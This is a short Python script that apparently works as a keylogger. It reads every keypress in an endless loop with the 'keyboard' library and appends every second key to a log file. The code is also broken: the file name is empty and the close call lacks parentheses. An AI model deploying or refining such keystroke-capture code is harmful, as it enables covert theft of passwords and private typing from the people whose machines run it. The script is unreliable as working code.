import keyboard

x = 0
while True:
    x += 1
    some_letter = keyboard.read_key()
    if  x % 2 == 0:
       recorder_file = open('','a')
       recorder_file.write('\n' + some_letter)
       recorder_file.close
    else:
        continue







